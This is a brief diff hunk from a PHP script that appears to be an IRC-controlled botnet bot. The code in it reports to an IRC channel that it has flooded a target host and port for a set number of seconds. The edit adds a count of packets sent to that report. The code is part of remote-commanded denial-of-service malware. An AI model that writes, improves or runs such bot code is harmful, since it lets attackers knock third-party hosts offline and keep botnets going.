@@ -138,7 +138,7 @@ while(is_resource($sock)){
 				fwrite($sock, 'PRIVMSG '.$d[2].' :Successfully started flooding '.$dos[1].':'.$dos[2].' using '.$dos[0].".\r\n");
 				while(1){
 					if(time() > $time){
-						fwrite($sock, 'PRIVMSG '.$d[2].' :Successfully flooded '.$dos[1].':'.$dos[2].' for '.$dos[3]." seconds using $dos[1].\r\n");
+						fwrite($sock, 'PRIVMSG '.$d[2].' :Successfully flooded '.$dos[1].':'.$dos[2].' for '.$dos[3]." seconds using $dos[1], sent $packets packets.\r\n");
 						break;
 					}
 					if($error > 0){
